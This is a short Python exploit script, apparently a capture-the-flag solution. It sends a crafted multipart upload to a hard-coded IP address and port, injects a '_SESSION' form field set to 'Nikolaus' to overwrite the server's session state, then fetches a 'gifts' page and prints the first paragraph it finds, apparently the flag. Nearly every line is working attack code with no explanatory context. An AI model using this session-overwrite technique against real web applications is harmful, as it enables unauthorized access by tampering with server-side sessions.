import requests
from bs4 import BeautifulSoup

url = "http://23.251.159.213:5667/?page=upload"
url2 = "http://23.251.159.213:5667/?page=gifts"
payload = ''' -----------------------------180251837238646225392010562464
Content-Disposition: form-data; name="target_file"; filename="123"
Content-Type: text/plain

123
-----------------------------180251837238646225392010562464
Content-Disposition: form-data; name="_SESSION"; filename="Nikolaus"
Content-Type: text/plain

Nikolaus
-----------------------------180251837238646225392010562464
Content-Disposition: form-data; name="submit"

Upload
-----------------------------180251837238646225392010562464--
'''

headers = {"Content-Type": "multipart/form-data; boundary=---------------------------180251837238646225392010562464"}

s = requests.Session()
s.post(url,data=payload,headers=headers)
r = s.get(url2)
data =r.text
soup = BeautifulSoup(data,features="html.parser")
res = soup.find_all("p")
print("[+] "+str(res[0])[3:-4:])